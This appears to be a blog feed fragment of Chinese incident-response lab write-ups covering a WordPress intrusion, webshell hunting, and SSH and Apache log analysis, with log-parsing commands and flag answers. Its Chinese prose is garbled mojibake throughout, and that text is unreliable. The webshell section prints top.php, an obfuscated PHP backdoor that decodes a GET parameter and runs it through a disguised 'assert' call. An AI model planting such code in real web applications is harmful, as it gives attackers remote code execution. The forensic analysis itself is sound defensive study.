<h3 id="wordpress"><a href="#wordpress" class="headerlink" title="wordpress"></a>wordpress</h3><h4 id="è¯·æäº¤æ”»å‡»è€…æ”»å‡»æˆåŠŸçš„ç¬¬ä¸€æ—¶é—´ï¼Œæ ¼å¼ï¼šflag-YY-MM-DD-hh-mm-ss"><a href="#è¯·æäº¤æ”»å‡»è€…æ”»å‡»æˆåŠŸçš„ç¬¬ä¸€æ—¶é—´ï¼Œæ ¼å¼ï¼šflag-YY-MM-DD-hh-mm-ss" class="headerlink" title="è¯·æäº¤æ”»å‡»è€…æ”»å‡»æˆåŠŸçš„ç¬¬ä¸€æ—¶é—´ï¼Œæ ¼å¼ï¼šflag{YY:MM:DD hh:mm:ss}"></a>è¯·æäº¤æ”»å‡»è€…æ”»å‡»æˆåŠŸçš„ç¬¬ä¸€æ—¶é—´ï¼Œæ ¼å¼ï¼šflag{YY:MM:DD hh:mm:ss}</h4><p>å…ˆçœ‹æ—¥å¿—ï¼Œçœ‹nginxçš„æ—¥å¿—</p>
<p>æ€è·¯æ˜¯çœ‹æœ€æ—©æ˜¯ä»€ä¹ˆæ—¶å€™å‡ºç°302é‡å®šå‘ï¼Œè¿›å…¥manage</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/%E6%88%AA%E5%B1%8F2024-06-01%2014.41.46.png" ></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;2023:04:29 22:45:23&#125;</span><br></pre></td></tr></table></figure>

<h4 id="è¯·æäº¤æ”»å‡»è€…çš„æµè§ˆå™¨ç‰ˆæœ¬-flag-Firgfox-2200"><a href="#è¯·æäº¤æ”»å‡»è€…çš„æµè§ˆå™¨ç‰ˆæœ¬-flag-Firgfox-2200" class="headerlink" title="è¯·æäº¤æ”»å‡»è€…çš„æµè§ˆå™¨ç‰ˆæœ¬ flag{Firgfox&#x2F;2200}"></a>è¯·æäº¤æ”»å‡»è€…çš„æµè§ˆå™¨ç‰ˆæœ¬ flag{Firgfox&#x2F;2200}</h4><p>ä¸Šä¸€é“é¢˜å¯ä»¥çœ‹åˆ°</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;Firefox/110.0&#125;</span><br></pre></td></tr></table></figure>

<h4 id="è¯·æäº¤æ”»å‡»è€…ç›®å½•æ‰«ææ‰€ä½¿ç”¨çš„å·¥å…·åç§°"><a href="#è¯·æäº¤æ”»å‡»è€…ç›®å½•æ‰«ææ‰€ä½¿ç”¨çš„å·¥å…·åç§°" class="headerlink" title="è¯·æäº¤æ”»å‡»è€…ç›®å½•æ‰«ææ‰€ä½¿ç”¨çš„å·¥å…·åç§°"></a>è¯·æäº¤æ”»å‡»è€…ç›®å½•æ‰«ææ‰€ä½¿ç”¨çš„å·¥å…·åç§°</h4><p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240601144356.png" ></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;Fuzz Faster U Fool&#125;</span><br></pre></td></tr></table></figure>

<h4 id="æ‰¾åˆ°æ”»å‡»è€…å†™å…¥çš„æ¶æ„åé—¨æ–‡ä»¶ï¼Œæäº¤æ–‡ä»¶åï¼ˆå®Œæ•´è·¯å¾„ï¼‰"><a href="#æ‰¾åˆ°æ”»å‡»è€…å†™å…¥çš„æ¶æ„åé—¨æ–‡ä»¶ï¼Œæäº¤æ–‡ä»¶åï¼ˆå®Œæ•´è·¯å¾„ï¼‰" class="headerlink" title="æ‰¾åˆ°æ”»å‡»è€…å†™å…¥çš„æ¶æ„åé—¨æ–‡ä»¶ï¼Œæäº¤æ–‡ä»¶åï¼ˆå®Œæ•´è·¯å¾„ï¼‰"></a>æ‰¾åˆ°æ”»å‡»è€…å†™å…¥çš„æ¶æ„åé—¨æ–‡ä»¶ï¼Œæäº¤æ–‡ä»¶åï¼ˆå®Œæ•´è·¯å¾„ï¼‰</h4><p>ç”¨Dç›¾æŸ¥æ€ä¸€ä¸‹ï¼Œæ‰¾åˆ°.x.php</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240601145929.png" ></p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240601150123.png" ></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;C:\phpstudy_pro\WWW\.x.php&#125;</span><br></pre></td></tr></table></figure>

<h4 id="æ‰¾åˆ°æ”»å‡»è€…éšè—åœ¨æ­£å¸¸webåº”ç”¨ä»£ç ä¸­çš„æ¶æ„ä»£ç ï¼Œæäº¤è¯¥æ–‡ä»¶åï¼ˆå®Œæ•´è·¯å¾„ï¼‰"><a href="#æ‰¾åˆ°æ”»å‡»è€…éšè—åœ¨æ­£å¸¸webåº”ç”¨ä»£ç ä¸­çš„æ¶æ„ä»£ç ï¼Œæäº¤è¯¥æ–‡ä»¶åï¼ˆå®Œæ•´è·¯å¾„ï¼‰" class="headerlink" title="æ‰¾åˆ°æ”»å‡»è€…éšè—åœ¨æ­£å¸¸webåº”ç”¨ä»£ç ä¸­çš„æ¶æ„ä»£ç ï¼Œæäº¤è¯¥æ–‡ä»¶åï¼ˆå®Œæ•´è·¯å¾„ï¼‰"></a>æ‰¾åˆ°æ”»å‡»è€…éšè—åœ¨æ­£å¸¸webåº”ç”¨ä»£ç ä¸­çš„æ¶æ„ä»£ç ï¼Œæäº¤è¯¥æ–‡ä»¶åï¼ˆå®Œæ•´è·¯å¾„ï¼‰</h4><p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/%E6%88%AA%E5%B1%8F2024-06-01%2015.02.39.png" ></p>
<p>è¿˜æ˜¯è¢«Dç›¾å‘ç°äº†</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;C:\phpstudy_pro\WWW\usr\themes\default\post.php&#125;</span><br></pre></td></tr></table></figure>

<h4 id="è¯·æŒ‡å‡ºå¯ç–‘è¿›ç¨‹é‡‡ç”¨çš„è‡ªåŠ¨å¯åŠ¨çš„æ–¹å¼ï¼Œå¯åŠ¨çš„è„šæœ¬çš„åå­—-flag-1-exe"><a href="#è¯·æŒ‡å‡ºå¯ç–‘è¿›ç¨‹é‡‡ç”¨çš„è‡ªåŠ¨å¯åŠ¨çš„æ–¹å¼ï¼Œå¯åŠ¨çš„è„šæœ¬çš„åå­—-flag-1-exe" class="headerlink" title="è¯·æŒ‡å‡ºå¯ç–‘è¿›ç¨‹é‡‡ç”¨çš„è‡ªåŠ¨å¯åŠ¨çš„æ–¹å¼ï¼Œå¯åŠ¨çš„è„šæœ¬çš„åå­— flag{1.exe}"></a>è¯·æŒ‡å‡ºå¯ç–‘è¿›ç¨‹é‡‡ç”¨çš„è‡ªåŠ¨å¯åŠ¨çš„æ–¹å¼ï¼Œå¯åŠ¨çš„è„šæœ¬çš„åå­— flag{1.exe}</h4><p>windowsç›®å½•ä¸‹æœ‰ä¸ª360.exeå’Œx.batï¼ˆå†…å®¹æ˜¯â€C:\Windows\360.exeâ€ï¼‰</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240601150516.png" ></p>
<p>æ²™ç®±ä¹Ÿèƒ½çœ‹åˆ°360.exeæ˜¯æœ¨é©¬</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240601151153.png" ></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;x.bat&#125;</span><br></pre></td></tr></table></figure>

<h3 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h3><p><a class="link"   href="https://tryhackmyoffsecbox.github.io/Target-Machines-WriteUp/docs/Xuanji/" >https://tryhackmyoffsecbox.github.io/Target-Machines-WriteUp/docs/Xuanji/<i class="fas fa-external-link-alt"></i></a></p>
<p><a class="link"   href="https://xz.aliyun.com/t/14254?time__1311=mqmx9QiQi=0=DQeDsNOf1TKnq40ErD&alichlgref=https://www.google.com/" >https://xz.aliyun.com/t/14254?time__1311=mqmx9QiQi%3D0%3DDQeDsNOf1TKnq40ErD&amp;alichlgref=https%3A%2F%2Fwww.google.com%2F<i class="fas fa-external-link-alt"></i></a></p>
]]></content>
      <tags>
        <tag>åº”æ€¥å“åº”</tag>
      </tags>
  </entry>
  <entry>
    <title>ç„æœº--webshellæŸ¥æ€</title>
    <url>/2024/05/31/%E7%8E%84%E6%9C%BA-webshell%E6%9F%A5%E6%9D%80/</url>
    <content><![CDATA[<h4 id="å†™åœ¨å‰é¢"><a href="#å†™åœ¨å‰é¢" class="headerlink" title="å†™åœ¨å‰é¢"></a>å†™åœ¨å‰é¢</h4><p>æŠ¤ç½‘è¦æ¥äº†ï¼Œå¥½ä¹…æ²¡å†™åšå®¢äº†ï¼ˆæ»‘è·ªï¼‰ã€‚å‰æ®µæ—¶é—´æœ‹å‹ç»™äº†ä¸ªå·ï¼Œåšä¸€æ³¢è®°å½•ä¸€ä¸‹ï¼Œä¸€äº›è¯­å¥å’Œå·¥å…·å¾ˆå€¼å¾—å­¦ä¹ ã€‚</p>
<h4 id="é»‘å®¢webshellé‡Œé¢çš„flag-flag-xxxxx-xxxx-xxxx-xxxx-xxxx"><a href="#é»‘å®¢webshellé‡Œé¢çš„flag-flag-xxxxx-xxxx-xxxx-xxxx-xxxx" class="headerlink" title="é»‘å®¢webshellé‡Œé¢çš„flag flag{xxxxx-xxxx-xxxx-xxxx-xxxx}"></a>é»‘å®¢webshellé‡Œé¢çš„flag flag{xxxxx-xxxx-xxxx-xxxx-xxxx}</h4><p>å…ˆæŠŠhtmlæ–‡ä»¶å¤¹ä¸‹çš„æºç ä¸‹è½½åˆ°æœ¬åœ°</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">tar -czvf src.tar.gz ./*</span><br></pre></td></tr></table></figure>

<p>ç„¶åç”¨dç›¾æŸ¥æ€ä¸€ä¸‹</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240531225522.png" ></p>
<p>æŸ¥çœ‹gz.phpï¼Œçœ‹åˆ°flag</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;027ccd04-5065-48b6-a32d-77c704a5e26d&#125;</span><br></pre></td></tr></table></figure>

<h4 id="é»‘å®¢ä½¿ç”¨çš„ä»€ä¹ˆå·¥å…·çš„shell-githubåœ°å€çš„md5-flag-md5"><a href="#é»‘å®¢ä½¿ç”¨çš„ä»€ä¹ˆå·¥å…·çš„shell-githubåœ°å€çš„md5-flag-md5" class="headerlink" title="é»‘å®¢ä½¿ç”¨çš„ä»€ä¹ˆå·¥å…·çš„shell githubåœ°å€çš„md5 flag{md5}"></a>é»‘å®¢ä½¿ç”¨çš„ä»€ä¹ˆå·¥å…·çš„shell githubåœ°å€çš„md5 flag{md5}</h4><p>gz.phpçœ‹çš„å‡ºæ¥ç”¨çš„æ˜¯å“¥æ–¯æ‹‰çš„æœ¨é©¬</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://github.com/BeichenDream/Godzilla</span><br><span class="line">md5:39392de3218c333f794befef07ac9257</span><br></pre></td></tr></table></figure>

<h4 id="é»‘å®¢éšè—shellçš„å®Œæ•´è·¯å¾„çš„md5-flag-md5-æ³¨-xxx-xxx-xxx-xxx-xxx-xxx"><a href="#é»‘å®¢éšè—shellçš„å®Œæ•´è·¯å¾„çš„md5-flag-md5-æ³¨-xxx-xxx-xxx-xxx-xxx-xxx" class="headerlink" title="é»‘å®¢éšè—shellçš„å®Œæ•´è·¯å¾„çš„md5 flag{md5} æ³¨ : &#x2F;xxx&#x2F;xxx&#x2F;xxx&#x2F;xxx&#x2F;xxx.xxx"></a>é»‘å®¢éšè—shellçš„å®Œæ•´è·¯å¾„çš„md5 flag{md5} æ³¨ : &#x2F;xxx&#x2F;xxx&#x2F;xxx&#x2F;xxx&#x2F;xxx.xxx</h4><p>Dç›¾çœ‹åˆ°æœ‰ä¸€ä¸ª.Mysqli.php</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/var/www/html/include/Db/.Mysqli.php</span><br><span class="line">md5:aebac0e58cd6c5fad1695ee4d1ac1919</span><br></pre></td></tr></table></figure>

<h4 id="é»‘å®¢å…æ€é©¬å®Œæ•´è·¯å¾„-md5-flag-md5"><a href="#é»‘å®¢å…æ€é©¬å®Œæ•´è·¯å¾„-md5-flag-md5" class="headerlink" title="é»‘å®¢å…æ€é©¬å®Œæ•´è·¯å¾„ md5 flag{md5}"></a>é»‘å®¢å…æ€é©¬å®Œæ•´è·¯å¾„ md5 flag{md5}</h4><p>dç›¾çœ‹åˆ°æœ‰ä¸€ä¸ªtop.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$key</span> = <span class="string">&quot;password&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//ERsDHgEUC1hI</span></span><br><span class="line"><span class="variable">$fun</span> = <span class="title function_ invoke__">base64_decode</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;func&#x27;</span>]);</span><br><span class="line"><span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span>&lt;<span class="title function_ invoke__">strlen</span>(<span class="variable">$fun</span>);<span class="variable">$i</span>++)&#123;</span><br><span class="line">    <span class="variable">$fun</span>[<span class="variable">$i</span>] = <span class="variable">$fun</span>[<span class="variable">$i</span>]^<span class="variable">$key</span>[<span class="variable">$i</span>+<span class="number">1</span>&amp;<span class="number">7</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="string">&quot;a&quot;</span>;</span><br><span class="line"><span class="variable">$s</span> = <span class="string">&quot;s&quot;</span>;</span><br><span class="line"><span class="variable">$c</span>=<span class="variable">$a</span>.<span class="variable">$s</span>.<span class="variable">$_GET</span>[<span class="string">&quot;func2&quot;</span>];</span><br><span class="line"><span class="variable">$c</span>(<span class="variable">$fun</span>);</span><br></pre></td></tr></table></figure>

<p>æ˜æ˜¾æœ‰æ··æ·†å’Œç¼–ç </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">è·¯å¾„ï¼š/var/www/html/wap/top.php</span><br><span class="line">md5:eeff2eabfd9b7a6d26fc1a53d3f7d1de</span><br></pre></td></tr></table></figure>

]]></content>
      <tags>
        <tag>åº”æ€¥å“åº”</tag>
      </tags>
  </entry>
  <entry>
    <title>ç„æœº--æ—¥å¿—åˆ†æ</title>
    <url>/2024/05/31/%E7%8E%84%E6%9C%BA-%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90/</url>
    <content><![CDATA[<h3 id="linuxæ—¥å¿—åˆ†æ"><a href="#linuxæ—¥å¿—åˆ†æ" class="headerlink" title="linuxæ—¥å¿—åˆ†æ"></a>linuxæ—¥å¿—åˆ†æ</h3><h4 id="æœ‰å¤šå°‘IPåœ¨çˆ†ç ´ä¸»æœºsshçš„rootå¸å·ï¼Œå¦‚æœæœ‰å¤šä¸ªä½¿ç”¨â€-â€åˆ†å‰²"><a href="#æœ‰å¤šå°‘IPåœ¨çˆ†ç ´ä¸»æœºsshçš„rootå¸å·ï¼Œå¦‚æœæœ‰å¤šä¸ªä½¿ç”¨â€-â€åˆ†å‰²" class="headerlink" title="æœ‰å¤šå°‘IPåœ¨çˆ†ç ´ä¸»æœºsshçš„rootå¸å·ï¼Œå¦‚æœæœ‰å¤šä¸ªä½¿ç”¨â€,â€åˆ†å‰²"></a>æœ‰å¤šå°‘IPåœ¨çˆ†ç ´ä¸»æœºsshçš„rootå¸å·ï¼Œå¦‚æœæœ‰å¤šä¸ªä½¿ç”¨â€,â€åˆ†å‰²</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cat /var/log/auth.log.1 | grep -a &quot;Failed password for root&quot; | awk &#x27;&#123;print $11&#125;&#x27; | sort | uniq -c | sort -nr </span><br></pre></td></tr></table></figure>

<p>å­¦ä¸€æŠŠè¿™äº›è¯­å¥</p>
<p><strong>grep</strong>æŠŠæœ‰â€Failed password for rootâ€çš„è¡ŒæŒ‘å‡ºæ¥ï¼Œ**-a**æ˜¯å°†æ–‡ä»¶ä½œä¸ºæ–‡æœ¬æ–‡ä»¶å¤„ç†ï¼Œé¿å…æŸäº›æƒ…å†µä¸‹æ–‡ä»¶è¢«è¯†åˆ«ä¸ºäºŒè¿›åˆ¶æ–‡ä»¶</p>
<p><strong>awk</strong>æŠŠæŒ‘å‡ºæ¥çš„è¡Œé‡Œç¬¬11ä¸ªå­—æ®µæŒ‘å‡ºæ¥ï¼ˆæŒ‰ç©ºæ ¼åˆ†ï¼‰ï¼Œè¿™é‡ŒæŒ‘å‡ºé‚£äº›ipåœ°å€</p>
<p><strong>sort</strong>æŠŠipåœ°å€æ’åºï¼Œ**-n<strong>æŒ‰æ•°å­—æ’åºï¼Œ</strong>-r**é™åºæ’åº</p>
<p><strong>uniq</strong>å»é‡,<strong>-c</strong>è¾“å‡ºä¸­æ˜¾ç¤ºæ¯ä¸ªè¡Œé‡å¤å‡ºç°çš„æ¬¡æ•°</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">root@ip-10-0-10-6:/var/log# cat /var/log/auth.log.1 | grep -a &quot;Failed password for root&quot; | awk &#x27;&#123;print $11&#125;&#x27; | sort | uniq -c | sort -nr</span><br><span class="line">      4 192.168.200.2</span><br><span class="line">      1 192.168.200.32</span><br><span class="line">      1 192.168.200.31</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;192.168.200.2,192.168.200.32,192.168.200.31&#125;</span><br></pre></td></tr></table></figure>

<h4 id="sshçˆ†ç ´æˆåŠŸç™»é™†çš„IPæ˜¯å¤šå°‘ï¼Œå¦‚æœæœ‰å¤šä¸ªä½¿ç”¨â€-â€åˆ†å‰²"><a href="#sshçˆ†ç ´æˆåŠŸç™»é™†çš„IPæ˜¯å¤šå°‘ï¼Œå¦‚æœæœ‰å¤šä¸ªä½¿ç”¨â€-â€åˆ†å‰²" class="headerlink" title="sshçˆ†ç ´æˆåŠŸç™»é™†çš„IPæ˜¯å¤šå°‘ï¼Œå¦‚æœæœ‰å¤šä¸ªä½¿ç”¨â€,â€åˆ†å‰²"></a>sshçˆ†ç ´æˆåŠŸç™»é™†çš„IPæ˜¯å¤šå°‘ï¼Œå¦‚æœæœ‰å¤šä¸ªä½¿ç”¨â€,â€åˆ†å‰²</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@ip-10-0-10-6:/var/log<span class="comment"># cat auth.log* | grep -a &quot;Accept&quot; | awk &#x27;&#123;print $11&#125;&#x27; | sort | uniq -c | sort -nr</span></span><br><span class="line">      2 192.168.200.2</span><br><span class="line">      1 202.78.166.217</span><br></pre></td></tr></table></figure>

<p>æ€è·¯å’Œä¸Šä¸€é“å·®ä¸å¤šï¼Œgrepè¿‡æ»¤çš„å­—æ®µæ”¹æˆâ€Acceptâ€</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;192.168.200.2&#125; # è¦åˆ æ‰è‡ªå·±çš„ip</span><br></pre></td></tr></table></figure>

<h4 id="çˆ†ç ´ç”¨æˆ·åå­—å…¸æ˜¯ä»€ä¹ˆï¼Ÿå¦‚æœæœ‰å¤šä¸ªä½¿ç”¨â€-â€åˆ†å‰²"><a href="#çˆ†ç ´ç”¨æˆ·åå­—å…¸æ˜¯ä»€ä¹ˆï¼Ÿå¦‚æœæœ‰å¤šä¸ªä½¿ç”¨â€-â€åˆ†å‰²" class="headerlink" title="çˆ†ç ´ç”¨æˆ·åå­—å…¸æ˜¯ä»€ä¹ˆï¼Ÿå¦‚æœæœ‰å¤šä¸ªä½¿ç”¨â€,â€åˆ†å‰²"></a>çˆ†ç ´ç”¨æˆ·åå­—å…¸æ˜¯ä»€ä¹ˆï¼Ÿå¦‚æœæœ‰å¤šä¸ªä½¿ç”¨â€,â€åˆ†å‰²</h4><p>ä¸Šé¢˜è§£</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">root@ip-10-0-10-6:/var/log# cat /var/log/auth.log.1 | grep -a &quot;Failed password&quot; | perl -e &#x27;while($_=&lt;&gt;)&#123; /for(.*?) from/; print &quot;$1\n&quot;;&#125;&#x27;| uniq -c | sort -nr</span><br><span class="line">      5  invalid user user</span><br><span class="line">      5  invalid user hello</span><br><span class="line">      5  invalid user</span><br><span class="line">      4  root</span><br><span class="line">      1  root</span><br><span class="line">      1  root</span><br><span class="line">      1  invalid user test3</span><br><span class="line">      1  invalid user test2</span><br><span class="line">      1  invalid user test1</span><br></pre></td></tr></table></figure>

<p>å¯¹äºè¿™ä¸ªperlæ¯”è¾ƒé™Œç”Ÿ</p>
<p><strong>Perl</strong> å‘½ä»¤ï¼Œç”¨äºä»åŒ¹é…çš„æ—¥å¿—è¡Œä¸­æå–ç”¨æˆ·åã€‚</p>
<p><code>while($_=&lt;&gt;)</code>é€è¡Œè¯»å–è¾“å…¥ï¼ˆå³æ—¥å¿—æ–‡ä»¶çš„å†…å®¹ï¼‰ã€‚</p>
<p><code> /for(.*?) from/</code>ä½¿ç”¨æ­£åˆ™è¡¨è¾¾å¼åŒ¹é… for å’Œfrom ä¹‹é—´çš„å†…å®¹ï¼ˆå³ç”¨æˆ·åï¼‰ã€‚</p>
<p> <code>print &quot;$1\n&quot;;</code>æ‰“å°åŒ¹é…åˆ°çš„ç”¨æˆ·åï¼ˆæ•è·ç»„ <strong>$1</strong>ï¼‰</p>
<p>æ€è·¯å°±æ˜¯ç”¨grepè¿‡æ»¤åç”¨perl -eå¤„ç†æ¯è¡Œè¯­å¥ï¼ŒæŠŠforå’Œfromä¹‹é—´çš„å­—æ®µï¼ˆé€šå¸¸æ˜¯ç”¨æˆ·åï¼‰æŒ‘å‡ºæ¥**ï¼Œå†è¿›è¡Œåç»­æ“ä½œ</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;user,hello,root,test3,test2,test1&#125;</span><br></pre></td></tr></table></figure>

<h4 id="ç™»é™†æˆåŠŸçš„IPå…±çˆ†ç ´äº†å¤šå°‘æ¬¡"><a href="#ç™»é™†æˆåŠŸçš„IPå…±çˆ†ç ´äº†å¤šå°‘æ¬¡" class="headerlink" title="ç™»é™†æˆåŠŸçš„IPå…±çˆ†ç ´äº†å¤šå°‘æ¬¡"></a>ç™»é™†æˆåŠŸçš„IPå…±çˆ†ç ´äº†å¤šå°‘æ¬¡</h4><p>ç¬¬ä¸€é¢˜çš„å‘½ä»¤å·²ç»è¿‡æ»¤å‡ºæ¥äº†</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">root@ip-10-0-10-6:/var/log# cat /var/log/auth.log.1 | grep -a &quot;Failed password for root&quot; | awk &#x27;&#123;print $11&#125;&#x27; | sort | uniq -c | sort -nr</span><br><span class="line">      4 192.168.200.2</span><br><span class="line">      1 192.168.200.32</span><br><span class="line">      1 192.168.200.31</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;4&#125;</span><br></pre></td></tr></table></figure>

<h4 id="é»‘å®¢ç™»é™†ä¸»æœºåæ–°å»ºäº†ä¸€ä¸ªåé—¨ç”¨æˆ·ï¼Œç”¨æˆ·åæ˜¯å¤šå°‘"><a href="#é»‘å®¢ç™»é™†ä¸»æœºåæ–°å»ºäº†ä¸€ä¸ªåé—¨ç”¨æˆ·ï¼Œç”¨æˆ·åæ˜¯å¤šå°‘" class="headerlink" title="é»‘å®¢ç™»é™†ä¸»æœºåæ–°å»ºäº†ä¸€ä¸ªåé—¨ç”¨æˆ·ï¼Œç”¨æˆ·åæ˜¯å¤šå°‘"></a>é»‘å®¢ç™»é™†ä¸»æœºåæ–°å»ºäº†ä¸€ä¸ªåé—¨ç”¨æˆ·ï¼Œç”¨æˆ·åæ˜¯å¤šå°‘</h4><p>å¯ä»¥ç›´æ¥çœ‹&#x2F;etc&#x2F;passwdï¼Œå¤šäº†ä¸ªtest2</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">root@ip-10-0-10-6:/var/log# cat /etc/passwd</span><br><span class="line">...</span><br><span class="line">test2:x:1000:1000::/home/test2:/bin/sh</span><br><span class="line">debian:x:1001:1001:Debian:/home/debian:/bin/bash</span><br></pre></td></tr></table></figure>

<p>ä¹Ÿå¯ä»¥</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">root@ip-10-0-10-6:/var/log# cat /var/log/auth.log* | grep -a &quot;useradd&quot; | grep -a &quot;linux-rz&quot;</span><br><span class="line">Aug  1 07:50:45 linux-rz useradd[7551]: new group: name=test2, GID=1000</span><br><span class="line">Aug  1 07:50:45 linux-rz useradd[7551]: new user: name=test2, UID=1000, GID=1000, home=/home/test2, shell=/bin/sh</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;test2&#125;</span><br></pre></td></tr></table></figure>

<h3 id="apacheæ—¥å¿—åˆ†æ"><a href="#apacheæ—¥å¿—åˆ†æ" class="headerlink" title="apacheæ—¥å¿—åˆ†æ"></a>apacheæ—¥å¿—åˆ†æ</h3><h4 id="æäº¤å½“å¤©è®¿é—®æ¬¡æ•°æœ€å¤šçš„IPï¼Œå³é»‘å®¢IPï¼š"><a href="#æäº¤å½“å¤©è®¿é—®æ¬¡æ•°æœ€å¤šçš„IPï¼Œå³é»‘å®¢IPï¼š" class="headerlink" title="æäº¤å½“å¤©è®¿é—®æ¬¡æ•°æœ€å¤šçš„IPï¼Œå³é»‘å®¢IPï¼š"></a>æäº¤å½“å¤©è®¿é—®æ¬¡æ•°æœ€å¤šçš„IPï¼Œå³é»‘å®¢IPï¼š</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">root@ip-10-0-10-5:/var/log/apache2# cat access.log.1 | grep &quot;03/Aug/2023:08:&quot; | awk &#x27;&#123;print $1&#125;&#x27; | sort | uniq -c | sort -nr | head -n 10</span><br><span class="line">   6555 192.168.200.2</span><br><span class="line">     29 ::1</span><br><span class="line">      5 192.168.200.38</span><br><span class="line">      1 192.168.200.48</span><br><span class="line">      1 192.168.200.211</span><br></pre></td></tr></table></figure>

<p>è¿™æ¬¡grepè¿‡æ»¤çš„æ˜¯â€03&#x2F;Aug&#x2F;2023:08:â€</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;192.168.200.2&#125;</span><br></pre></td></tr></table></figure>

<h4 id="é»‘å®¢ä½¿ç”¨çš„æµè§ˆå™¨æŒ‡çº¹æ˜¯ä»€ä¹ˆï¼Œæäº¤æŒ‡çº¹çš„md5ï¼š"><a href="#é»‘å®¢ä½¿ç”¨çš„æµè§ˆå™¨æŒ‡çº¹æ˜¯ä»€ä¹ˆï¼Œæäº¤æŒ‡çº¹çš„md5ï¼š" class="headerlink" title="é»‘å®¢ä½¿ç”¨çš„æµè§ˆå™¨æŒ‡çº¹æ˜¯ä»€ä¹ˆï¼Œæäº¤æŒ‡çº¹çš„md5ï¼š"></a>é»‘å®¢ä½¿ç”¨çš„æµè§ˆå™¨æŒ‡çº¹æ˜¯ä»€ä¹ˆï¼Œæäº¤æŒ‡çº¹çš„md5ï¼š</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">root@ip-10-0-10-5:/var/log/apache2# cat /var/log/apache2/access.log* | grep &quot;192.168.200.2&quot; | awk -F&#x27;&quot;&#x27; &#x27;&#123;print $6&#125;&#x27; | uniq -c</span><br><span class="line">     12 Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/115.0</span><br><span class="line">      1 curl/7.74.0</span><br><span class="line">   6543 Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36</span><br></pre></td></tr></table></figure>

<p>ç›´æ¥grepä¸Šä¸€é¢˜æå–å‡ºæ¥çš„ip</p>
<p>**awk -Fâ€™â€â€˜ â€˜{print $6}â€™**è¿™é‡Œawk -FæŒ‡å®šåŒå¼•å·ä¸ºåˆ†å‰²ç¬¦ï¼Œå–ç¬¬å…­ä¸ªå­—æ®µ</p>
<blockquote>
<p>å¯¹äº Apache è®¿é—®æ—¥å¿—ï¼ŒåŒå¼•å·å†…çš„å­—æ®µé€šå¸¸æ˜¯è¯·æ±‚æ–¹æ³•ã€URLã€åè®®å’Œ User-Agent å­—ç¬¦ä¸²ã€‚ç¬¬å…­ä¸ªå­—æ®µé€šå¸¸æ˜¯ User-Agentã€‚</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">æŒ‡çº¹ï¼šMozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36</span><br><span class="line">md5:2d6330f380f44ac20f3a02eed0958f66</span><br></pre></td></tr></table></figure>

